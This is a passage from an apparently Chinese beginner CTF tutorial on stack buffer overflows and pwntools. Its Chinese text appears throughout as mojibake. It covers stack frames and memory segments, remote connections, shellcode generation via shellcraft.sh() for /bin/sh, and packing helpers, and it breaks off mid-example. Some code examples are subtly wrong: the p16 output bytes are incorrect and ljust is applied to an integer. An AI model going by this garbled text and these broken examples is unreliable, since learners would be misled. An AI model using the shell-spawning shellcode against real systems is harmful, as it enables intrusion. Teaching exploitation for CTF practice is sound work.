id="è¿™æ˜¯ä»€ä¹ˆï¼Ÿç¼“å†²åŒºï¼Ÿï¼æº¢å‡ºä¸€ä¸‹ï¼"><a href="#è¿™æ˜¯ä»€ä¹ˆï¼Ÿç¼“å†²åŒºï¼Ÿï¼æº¢å‡ºä¸€ä¸‹ï¼" class="headerlink" title="è¿™æ˜¯ä»€ä¹ˆï¼Ÿç¼“å†²åŒºï¼Ÿï¼æº¢å‡ºä¸€ä¸‹ï¼"></a>è¿™æ˜¯ä»€ä¹ˆï¼Ÿç¼“å†²åŒºï¼Ÿï¼æº¢å‡ºä¸€ä¸‹ï¼</h1><p>ç¼“å†²åŒºæº¢å‡ºå°±æ˜¯é•¿æ•°æ®å¤åˆ¶åˆ°å°çš„ç¼“å†²åŒºé‡Œï¼Œå¤šå‡ºçš„æ•°æ®ä¼šå‘ç”Ÿæ³„éœ²ï¼Œå¯¼è‡´å…¶ä»–æ•°æ®è¢«ç ´åã€‚<strong>å¸¸è§çš„æ ˆæº¢å‡ºå’Œå †æº¢å‡ºéƒ½åŒ…å«åœ¨å†…ï¼Œåªæ˜¯å‘ç”Ÿåœ¨æ ˆä¸Šå’Œå †ä¸Šçš„åŒºåˆ«è€Œå·²ã€‚</strong></p><p>è€Œå…¶ä¸­ï¼Œæ ˆæº¢å‡ºæ˜¯æœ€å¸¸è§çš„æ¼æ´ï¼Œä¸€èˆ¬æ¥è¯´éš¾åº¦ä¹Ÿæ¯”è¾ƒå°ï¼ˆä¹Ÿå¯ä»¥å¾ˆæ¶å¿ƒï¼‰ï¼Œä½œä¸ºpwnçš„èµ·ç‚¹å½“ä¹‹æ— æ„§å§ã€‚</p><h2 id="æ ˆã®åŸºç¡€"><a href="#æ ˆã®åŸºç¡€" class="headerlink" title="æ ˆã®åŸºç¡€"></a>æ ˆã®åŸºç¡€</h2><h3 id="ä»€ä¹ˆæ˜¯æ ˆï¼Ÿï¼ˆstackï¼‰"><a href="#ä»€ä¹ˆæ˜¯æ ˆï¼Ÿï¼ˆstackï¼‰" class="headerlink" title="ä»€ä¹ˆæ˜¯æ ˆï¼Ÿï¼ˆstackï¼‰"></a>ä»€ä¹ˆæ˜¯æ ˆï¼Ÿï¼ˆstackï¼‰</h3><p>æ ˆæ˜¯ä¸€ç§<strong>å…ˆè¿›åå‡º</strong>çš„æ•°æ®ç»“æ„ï¼Œè¿™ä¹Ÿæ­£å¥½æ»¡è¶³äº†è°ƒç”¨å‡½æ•°çš„æ–¹å¼ï¼Œå³ï¼šçˆ¶å‡½æ•°è°ƒç”¨å­å‡½æ•°ï¼Œçˆ¶åœ¨å‰ï¼Œå­åœ¨åï¼›è¿”å›å€¼æ—¶ï¼Œå­å‡½æ•°å…ˆè¿”å›ï¼Œçˆ¶å‡½æ•°åè¿”å›ã€‚</p><p>å¯¹æ ˆæœ‰pushï¼ˆå‹æ•°æ®å…¥æ ˆï¼‰ï¼Œpopï¼ˆå¼¹å‡ºæ•°æ®ï¼Œå¹¶å‚¨å­˜åˆ°æŒ‡å®šå¯„å­˜å™¨æˆ–å†…å­˜ä¸­ï¼‰ä¸¤ç§æ“ä½œã€‚</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/push_pop.png" alt="push&amp;pop"></p><p><strong>éœ€è¦æ³¨æ„:</strong> </p><p>1ï¼‰æ ˆçš„ç”Ÿé•¿æ˜¯<strong>ä»é«˜åœ°å€å¾€ä½åœ°å€</strong>ï¼Œå¯¹åº”ä¸Šé¢æ¼”ç¤ºçš„å‘ä¸‹ç”Ÿé•¿</p><p>2ï¼‰<strong>popåè¢«å¼¹å‡ºçš„æ•°æ®è¿˜åœ¨æ ˆå†…ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è®¿é—®ï¼ˆè¿˜æ˜¯å¯ä»¥è®¿é—®çš„ï¼‰</strong></p><h3 id="ä»€ä¹ˆæ˜¯æ ˆå¸§ï¼Ÿï¼ˆstack-frameï¼‰"><a href="#ä»€ä¹ˆæ˜¯æ ˆå¸§ï¼Ÿï¼ˆstack-frameï¼‰" class="headerlink" title="ä»€ä¹ˆæ˜¯æ ˆå¸§ï¼Ÿï¼ˆstack frameï¼‰"></a>ä»€ä¹ˆæ˜¯æ ˆå¸§ï¼Ÿï¼ˆstack frameï¼‰</h3><p>å…¶æœ¬è´¨å°±æ˜¯ä¸€ç§æ ˆï¼Œè¿™ç§æ ˆä¸“é—¨æ¥<strong>ä¿å­˜å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­çš„å„ç§ä¿¡æ¯ï¼ˆå‚æ•°ï¼Œè¿”å›åœ°å€ï¼Œæœ¬åœ°å˜é‡ç­‰ï¼‰ã€‚</strong></p><p>æ ˆå¸§æœ‰æ ˆé¡¶å’Œæ ˆåº•ä¹‹åˆ†ï¼Œ<strong>æ ˆé¡¶åœ°å€æœ€ä½ï¼Œæ ˆåº•åœ°å€æœ€é«˜ï¼ŒSPï¼ˆæ ˆæŒ‡é’ˆï¼‰æ˜¯ä¸€ç›´æŒ‡å‘æ ˆé¡¶çš„ã€‚</strong></p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ ˆå¸§ç¤ºæ„å›¾ï¼š</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/%E6%A0%88%E5%B8%A7.png" alt="æ ˆå¸§"></p><p>ä¸€èˆ¬æ¥è¯´ï¼Œ<code>bp</code>ï¼ˆåŸºå€æŒ‡é’ˆï¼‰åˆ°<code>sp</code>ä¹‹é—´çš„åŒºåŸŸå½“ä½œæ ˆå¸§ã€‚<strong>å¹¶ä¸æ˜¯æ•´ä¸ªæ ˆç©ºé—´åªæœ‰ä¸€ä¸ªæ ˆå¸§ï¼Œæ¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªæ–°çš„æ ˆå¸§</strong>ã€‚</p><p>å‡½æ•°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†è°ƒç”¨å‡½æ•°çš„å‡½æ•°ç§°ä¸º â€œè°ƒç”¨è€…ï¼ˆcallerï¼‰â€œï¼Œ è¢«è°ƒç”¨çš„å‡½æ•°ç§°ä¸º â€œè¢«è°ƒç”¨è€…ï¼ˆcalleeï¼‰â€ã€‚å…¶ä¸­ï¼š</p><p>1ï¼‰calleréœ€è¦çŸ¥é“åœ¨å“ªé‡Œè·å–calleeçš„è¿”å›å€¼</p><p>2ï¼‰calleeéœ€è¦çŸ¥é“ä¼ å…¥çš„å‚æ•°åœ¨å“ªé‡Œ</p><p>3ï¼‰è¿”å›åœ°å€åœ¨å“ªé‡Œ</p><p>åŒæ—¶ï¼Œ<strong>æˆ‘ä»¬è¦ä¿è¯åœ¨calleeè¿”å›åï¼Œ<code>bp</code>, <code>sp</code>ç­‰å¯„å­˜å™¨çš„å€¼åº”è¯¥å’Œè°ƒç”¨å‰ä¸€è‡´</strong>ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬è¦ç”¨æ ˆæ¥ä¿å­˜è¿™äº›æ•°æ®ã€‚</p><h2 id="bssï¼Œdataï¼Œtextï¼Œheap-amp-stack"><a href="#bssï¼Œdataï¼Œtextï¼Œheap-amp-stack" class="headerlink" title="bssï¼Œdataï¼Œtextï¼Œheap &amp; stack"></a>bssï¼Œdataï¼Œtextï¼Œheap &amp; stack</h2><h3 id="bss-segmentï¼š"><a href="#bss-segmentï¼š" class="headerlink" title="bss segmentï¼š"></a>bss segmentï¼š</h3><p>bssæ®µé€šå¸¸ç”¨æ¥å­˜æ”¾ç¨‹åºä¸­<strong>æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡</strong></p><p>bssæ˜¯ Block Started by Symbol çš„ç®€ç§°</p><p>bssæ®µå±äºé™æ€å†…å­˜åˆ†é…</p><h3 id="data-segmentï¼š"><a href="#data-segmentï¼š" class="headerlink" title="data segmentï¼š"></a>data segmentï¼š</h3><p>æ•°æ®æ®µé€šå¸¸å­˜æ”¾<strong>å·²ç»åˆå§‹åŒ–çš„å…¨å±€å˜é‡</strong>ï¼Œå±äºé™æ€å†…å­˜åˆ†é…</p><h3 id="code-text-segmentï¼š"><a href="#code-text-segmentï¼š" class="headerlink" title="code(text) segmentï¼š"></a>code(text) segmentï¼š</h3><p>ä»£ç æ®µé€šå¸¸ç”¨æ¥å­˜æ”¾ç¨‹åºæ‰§è¡Œä»£ç ï¼Œå…¶å¤§å°åœ¨ç¼–è¯‘æœŸç¡®å®šï¼Œå¹¶ä¸”è¯¥å†…å­˜åŒºåŸŸé€šå¸¸ä¸ºåªè¯»ï¼ˆæŸäº›æ¶æ„å…è®¸å¯å†™ï¼Œå³å…è®¸ä¿®æ”¹ç¨‹åºï¼‰</p><h3 id="å †ï¼ˆheapï¼‰ï¼š"><a href="#å †ï¼ˆheapï¼‰ï¼š" class="headerlink" title="å †ï¼ˆheapï¼‰ï¼š"></a>å †ï¼ˆheapï¼‰ï¼š</h3><p>å †ç”¨äºå­˜æ”¾ç¨‹åºè¿è¡Œä¸­è¢«åŠ¨æ€åˆ†é…çš„å†…å­˜æ®µï¼Œå¤§å°ä¸å›ºå®šï¼Œå¯åŠ¨æ€æ‰©å¼ æˆ–ç¼©å‡ã€‚</p><p>å½“è¿›ç¨‹è°ƒç”¨mallocç­‰å‡½æ•°åˆ†é…å†…å­˜æ—¶ï¼Œæ–°åˆ†é…çš„å†…å­˜ä¼šè¢«åŠ¨æ€æ·»åŠ åˆ°å †ä¸Šï¼ˆå †è¢«æ‰©å¼ ï¼‰ï¼›</p><p>ä½¿ç”¨freeç­‰å‡½æ•°é‡Šæ”¾å†…å­˜æ—¶ï¼Œè¢«é‡Šæ”¾çš„å†…å­˜ä»å †ä¸­è¢«å‰”é™¤ï¼ˆå †è¢«ç¼©å‡ï¼‰ã€‚</p><h3 id="æ ˆï¼ˆstackï¼‰"><a href="#æ ˆï¼ˆstackï¼‰" class="headerlink" title="æ ˆï¼ˆstackï¼‰"></a>æ ˆï¼ˆstackï¼‰</h3><p><strong>æ ˆåˆç§°å †æ ˆ</strong>ï¼Œæ˜¯ç”¨æˆ·å­˜æ”¾ç¨‹åº<strong>ä¸´æ—¶åˆ›å»ºçš„å±€éƒ¨å˜é‡</strong>ï¼Œä¹Ÿå°±æ˜¯ {} ä¸­å®šä¹‰çš„å˜é‡ï¼ˆä½†<strong>ä¸åŒ…æ‹¬staticå£°æ˜çš„å˜é‡</strong>ï¼Œstaticæ„å‘³ç€åœ¨æ•°æ®æ®µï¼ˆ.dataï¼‰ä¸­å­˜æ”¾å˜é‡ï¼‰ã€‚</p><p>æ­¤å¤–ï¼Œå‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå…¶å‚æ•°ä¹Ÿä¼šå‹å…¥å‘èµ·è°ƒç”¨çš„è¿›ç¨‹æ ˆä¸­ï¼Œå¹¶ä¸”å¾…åˆ°è°ƒç”¨ç»“æŸåï¼Œå‡½æ•°çš„è¿”å›å€¼ä¹Ÿä¼šè¢«å­˜æ”¾å›æ ˆä¸­ã€‚</p><p>ç”±äºæ ˆå…ˆè¿›åå‡ºçš„ç‰¹ç‚¹ï¼Œæ ˆç‰¹åˆ«æ–¹ä¾¿æ¥ä¿å­˜&#x2F;æ¢å¤è°ƒç”¨ç°åœºã€‚</p><p>ä»è¿™ä¸ªæ„ä¹‰ä¸Šï¼Œ<strong>æˆ‘ä»¬å¯ä»¥æŠŠå †æ ˆçœ‹æˆä¸€ä¸ªå¯„å­˜ï¼Œäº¤æ¢ä¸´æ—¶æ•°æ®çš„å†…å­˜åŒº</strong>ã€‚</p><h2 id="pwntoolsåŸºç¡€"><a href="#pwntoolsåŸºç¡€" class="headerlink" title="pwntoolsåŸºç¡€"></a>pwntoolsåŸºç¡€</h2><h3 id="å®‰è£…pwntools"><a href="#å®‰è£…pwntools" class="headerlink" title="å®‰è£…pwntools"></a>å®‰è£…pwntools</h3><p>ä½¿ç”¨pythonè‡ªå¸¦çš„pipä¸‹è½½pwntools</p><p><code>$ pip install pwntools</code></p><p>å¦‚æœåœ¨windowsä¸Šçš„wslä¸Šç›´æ¥ä½¿ç”¨è¯¥è¯­å¥å¯èƒ½ä¼šæŠ¥é”™</p><p><img src="/pwn%E6%96%B0%E6%89%8B%E6%9D%91/pip-error.png" alt="pip_err"></p><p>ä¸è¿‡å¥½åœ¨ç»™äº†ä½ æç¤ºï¼Œåªè¦åœ¨åé¢åŠ ä¸Š<code>--break-system-packages</code>å³å¯</p><p>ä¹Ÿå°±æ˜¯ï¼š<code>$ pip install pwntools --break-system-packages</code></p><h3 id="pwntoolsä½¿ç”¨"><a href="#pwntoolsä½¿ç”¨" class="headerlink" title="pwntoolsä½¿ç”¨"></a>pwntoolsä½¿ç”¨</h3><h4 id="åŸºæœ¬æ¡†æ¶"><a href="#åŸºæœ¬æ¡†æ¶" class="headerlink" title="åŸºæœ¬æ¡†æ¶"></a>åŸºæœ¬æ¡†æ¶</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *<span class="comment"># å¯¼å…¥pwntoolsæ¨¡å—</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span><span class="comment"># x64æ¶æ„åº”ä¸º &#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span><span class="comment"># è®¾ç½®ä¸ºç›®æ ‡æœºçš„ç³»ç»Ÿï¼Œä¸€èˆ¬æ˜¯linux</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span><span class="comment"># è¾“å‡ºè°ƒè¯•ä¿¡æ¯</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æˆ–è€…ç›´æ¥ä½¿ç”¨:</span></span><br><span class="line"><span class="string">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span></span><br><span class="line"><span class="string">å½“ç„¶ä¸€èˆ¬æƒ…å†µä¸‹archå’Œosä¸ç”¨è®¾ç½®ï¼ˆè¦ç”Ÿæˆshellcodeæ—¶å€™è¦è®¾ç½®ï¼‰ï¼Œåªè¦è®¾ç½®log_levelä¸ºdebugå°±å¯ä»¥äº†</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io = remote(<span class="string">&#x27;114.514.19.198&#x27;</span>, <span class="number">23333</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ç”¨æ¥å»ºç«‹ä¸€ä¸ªè¿œç¨‹è¿æ¥ï¼Œurlæˆ–è€…ipä½œä¸ºåœ°å€ï¼Œç„¶åæŒ‡æ˜ç«¯å£</span></span><br><span class="line"><span class="string">ä¹Ÿå¯ä»¥ä»…ä½¿ç”¨æœ¬åœ°æ–‡ä»¶ï¼Œæ–¹ä¾¿è°ƒè¯•:</span></span><br><span class="line"><span class="string">io = process(&#x27;./test_pwn_file&#x27;)</span></span><br><span class="line"><span class="string">processç”¨æ¥å¯åŠ¨ä¸€ä¸ªæœ¬åœ°è¿›ç¨‹ï¼Œéœ€è¦æ³¨æ„.elfä¸èƒ½åœ¨windowsä¸‹è¿è¡Œï¼Œåº”åœ¨wslæˆ–è€…è™šæ‹Ÿæœºé‡Œï¼Œå¦åˆ™ç¨‹åºä¼šæŠ¥é”™ï¼Œ.exeç­‰äº¦ç„¶ï¼Œæ‰€ä»¥æœ¬åœ°æ‰“çš„è¯è®°å¾—è„šæœ¬åœ¨åŒ¹é…çš„ç¯å¢ƒé‡Œæ‰§è¡Œ</span></span><br><span class="line"><span class="string">processé‡Œæ˜¯æ–‡ä»¶è·¯å¾„ï¼Œå…¶ä¸­ &#x27;test_pwn_file&#x27; æ˜¯æ–‡ä»¶åï¼Œå¯ä»¥æ˜¯ç›¸å¯¹åœ°å€ï¼Œä¹Ÿå¯ä»¥æ˜¯ç»å¯¹åœ°å€ï¼Œå½“ç„¶è¿˜æ˜¯å»ºè®®æŠŠexpï¼ˆæ”»å‡»åˆ©ç”¨è„šæœ¬ï¼‰å’Œpwnæ–‡ä»¶ï¼ˆä½ è¦æ‰“çš„ä¸œè¥¿ï¼‰æ”¾åˆ°åŒç›®å½•ä¸‹</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">asm(shellcraft.sh())</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">asm()æ¥æ”¶ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè¿”å›æ±‡ç¼–ç çš„æœºå™¨ç (bytes)</span></span><br><span class="line"><span class="string">æ¯”å¦‚:</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(&#x27;mov eax, 0x10&#x27;)</span></span><br><span class="line"><span class="string">b&#x27;\xb8\x10\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="string">shellcraftæ¨¡å—æ˜¯shellcodeçš„æ¨¡å—ï¼ŒåŒ…å«ä¸€äº›ç”Ÿæˆshellcodeçš„å‡½æ•°</span></span><br><span class="line"><span class="string">è¿™é‡Œshellcraft.sh()å°±æ˜¯æ‰§è¡Œ/bin/shçš„shellcode</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>asm(shellcraft.sh())</span></span><br><span class="line"><span class="string">b&#x27;jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># å°†æ§åˆ¶æƒè¿˜ç»™ç”¨æˆ·ï¼Œå³ç”¨æˆ·å¯åœ¨ç»ˆç«¯ç›´æ¥ä¸è¿›ç¨‹äº¤äº’</span></span><br><span class="line"><span class="comment"># åœ¨getshellä¹‹åä½¿ç”¨ï¼Œä¸€èˆ¬å°±æ”¾åœ¨è„šæœ¬æœ€åå°±è¡Œäº†</span></span><br></pre></td></tr></table></figure><h4 id="send-or-receive"><a href="#send-or-receive" class="headerlink" title="send or receive"></a>send or receive</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">io.send(payload)<span class="comment"># å°†payloadå‘é€åˆ°è¿œç¨‹è¿æ¥</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;payloadå«æ”»å‡»è½½è·ï¼Œå®é™…ä¸Šå°±æ˜¯ä½ è¦å‘é€çš„æ•°æ®ï¼Œå«è¿™ä¸ªåå­—åªæ˜¯æƒ¯ä¾‹äº†ï¼Œä½ ä¹Ÿå¯ä»¥å«å…¶ä»–ä»»ä½•åˆæ³•çš„å˜é‡å&#x27;&#x27;&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># ä¸sendç›¸æ¯”æ˜¯åœ¨å‘é€å®Œpayloadåä¼šå¤šå‘é€ä¸€ä¸ªå›è½¦(&#x27;\n&#x27;)</span></span><br><span class="line">io.sendafter(message, payload)</span><br><span class="line">io.sendlineafter(message, payload)</span><br><span class="line"><span class="comment"># è¿™ä¸¤ä¸ªå¾ˆå¥½ç†è§£ï¼Œå°±æ˜¯åœ¨æ¥æ”¶åˆ°messageä¹‹åå†å‘é€payload</span></span><br><span class="line"><span class="comment"># messageä¸éœ€è¦æ˜¯æ¥å—åˆ°çš„ä¸€æ•´ä¸ªæ¶ˆæ¯ï¼Œå¯ä»¥æ˜¯å…¶ä¸­çš„ç‰‡æ®µ</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">io.recv()</span><br><span class="line"><span class="comment"># æ¥æ”¶æ‰€æœ‰æ•°æ®ï¼Œè¿”å›æ¥æ”¶åˆ°çš„æ•°æ®</span></span><br><span class="line"><span class="comment"># å¯ä»¥æ¥æ”¶ä¸€ä¸ªintå‚æ•°ï¼Œè¡¨ç¤ºæ¥æ”¶å¤šå°‘ä¸ªå­—èŠ‚</span></span><br><span class="line"><span class="comment"># recv(6) å°±è¡¨ç¤ºæ¥æ”¶6ä¸ªå­—èŠ‚</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">æ¯”å¦‚ä½ æ”¶åˆ°äº†ä¸€æ®µæ¶ˆæ¯: b&#x27;hello,world!&#x27;</span></span><br><span class="line"><span class="string">recv(6) å°±ä¼šè¿”å› b&#x27;hello,&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io.recvuntil(message)</span><br><span class="line"><span class="comment"># æ¥æ”¶åˆ°messageååœæ­¢æ¥æ”¶ï¼Œè¿”å›åŒ…å«messageåœ¨å†…çš„å…¨éƒ¨æ•°æ®</span></span><br><span class="line"><span class="comment"># å¯ä»¥æŒ‡å®šä¸€ä¸ªdrop: boolå‚æ•°ï¼Œé»˜è®¤ä¸ºFalseï¼Œè‹¥ä¸ºTrueåˆ™åªè¿”å›messageä¹‹å‰çš„æ•°æ®(messageè¢«æŠ›å¼ƒäº†)</span></span><br><span class="line"><span class="comment"># å½“ç„¶å¦‚æœä½ ç»§ç»­æ¥æ”¶æ•°æ®çš„è¯æ˜¯ä¸ä¼šé‡æ–°æ¥æ”¶ä¸€émessageäº†ï¼Œåªä¼šä»messageä¹‹åç»§ç»­æ¥æ”¶</span></span><br><span class="line">io.recvline()</span><br><span class="line"><span class="comment"># æ¥æ”¶ä¸€è¡Œæ•°æ®å¹¶è¿”å›ï¼Œç­‰ä»·äº recvuntil(b&#x27;\n&#x27;)</span></span><br></pre></td></tr></table></figure><p><strong>ä¸Šè¿°å‘é€å’Œæ¥æ”¶çš„æ–¹æ³•å‡èƒ½æ¥å—<code>str</code>æˆ–<code>bytes</code>ç±»å‹çš„å‚æ•°</strong></p><h4 id="æ•°æ®æ‰“åŒ…"><a href="#æ•°æ®æ‰“åŒ…" class="headerlink" title="æ•°æ®æ‰“åŒ…"></a>æ•°æ®æ‰“åŒ…</h4><p>pwntoolsé‡Œå¯ä»¥ç”¨packå’Œunpackå‡½æ•°æŠŠintæ‰“åŒ…ä¸ºbytesï¼Œæˆ–è€…æŠŠbytesè§£åŒ…ä¸ºint</p><p>ä¸€èˆ¬ç›´æ¥ç”¨å°è£…å¥½çš„p16&#x2F;p32&#x2F;p64, u16&#x2F;u32&#x2F;u64ï¼ˆå¥½åƒç”¨vsä¼šè­¦å‘Šå§ï¼Œæˆ‘è‡ªå·±ç”¨æ˜¾ç¤ºæ²¡åœ¨pwntoolsæ‰¾åˆ°è¿™ç©æ„ï¼Œåæ­£èƒ½è·‘è„šæœ¬å°±è¡Œï¼‰</p><p>æ‰“åŒ… <code>p16/p32/p64</code>: æŠŠä¸€ä¸ªæ•´æ•°åˆ†åˆ«æ‰“åŒ…ä¸º16ï¼Œ32æˆ–64ä½</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>p64(<span class="number">0x7ffff3283296</span>)</span><br><span class="line"><span class="string">b&#x27;\x962(\xf3\xff\x7f\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># å³ b&#x27;\x96\x32\x28\xf3\xff\x7f\x00\x00&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p16(<span class="number">0x256</span>)</span><br><span class="line"><span class="string">b&#x27;V\x20&#x27;</span></span><br><span class="line"><span class="comment"># å³ b&#x27;\x56\x02&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>p32(<span class="number">0x8004082</span>)</span><br><span class="line"><span class="string">b&#x27;\x82@\x00\x08</span></span><br><span class="line"><span class="string"># å³ b&#x27;</span>\x82\x40\x00\x08<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>è§£åŒ… <code>u16/u32/u64</code>: è§£åŒ…ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆæˆ–bytesï¼‰ï¼Œå¾—åˆ°æ•´æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">`<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">è¦æ³¨æ„u16,u32,u64æ¥å—çš„å‚æ•°åˆ†åˆ«è¦æ˜¯2ï¼Œ4ï¼Œ8ä¸ªå­—èŠ‚ï¼Œå¦åˆ™ä¼šæŠ¥é”™</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>addr1 = <span class="string">b&#x27;\x962(\xf3\xff\x7f&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>u64(addr1)<span class="comment"># Error!!!</span></span><br><span class="line">...</span><br><span class="line">struct.error: unpack requires a buffer of <span class="number">8</span> <span class="built_in">bytes</span></span><br><span class="line"><span class="comment"># ä¸€èˆ¬æ¥å—æ•°æ®ä¸ç¡®å®šæœ‰å¤šé•¿å°±å¯ä»¥ç”¨ljustæ¥è¡¥åˆ°8ä¸ªå­—èŠ‚</span></span><br><span class="line"><span class="comment"># ç±»ä¼¼çš„æœ‰zfillï¼Œrjustç­‰ï¼Œå¯ä»¥è‡ªè¡Œä½“ä¼šå…¶ä¸­å·®å¼‚</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(u64(addr1).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;0x7ffff3283296&#x27;</span></span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„ï¼šå¦‚æœå¾…å»¶é•¿çš„æ•°æ®æ˜¯ <code>bytes</code>ï¼Œ<code>ljust</code>ç¬¬äºŒä¸ªå‚æ•°ä¹Ÿå¿…é¡»<code>bytes</code><br>å¦‚ä¸Šä¾‹å°±æ˜¯å¿…é¡»æ˜¯ <code>b&#39;\x00&#39;</code>æˆ–è€…<code>b&#39;\0&#39;</code>, ä¸èƒ½æ˜¯ <code>&#39;\x00&#39;</code>, <code>&#39;\0&#39;</code><br>å¦‚æœæ˜¯ <code>str</code> ç±»å‹ä¹Ÿæ˜¯ä¸€æ ·é“ç†</p><p><del><strong>å½“ç„¶å¦‚æœä½ ç”¨ python2 å°±å½“æˆ‘æ²¡è¯´</strong></del></p><h4 id="è¾“å‡ºæ•°æ®"><a href="#è¾“å‡ºæ•°æ®" class="headerlink" title="è¾“å‡ºæ•°æ®"></a>è¾“å‡ºæ•°æ®</h4><p>è¾“å‡ºå½“ç„¶å¯ä»¥ç”¨ <code>print</code></p><p>åªä¸è¿‡å»ºè®®ç”¨pwntoolsè‡ªå¸¦çš„è¾“å‡ºæ–¹å¼ï¼Œä¸€æ–¹é¢å»åˆpwntoolsæœ¬æ¥çš„æ ¼å¼ï¼Œä¸€æ–¹é¢çœ‹ç€æ¯”è¾ƒèˆ’é€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>out_str = <span class="string">&#x27;hello, 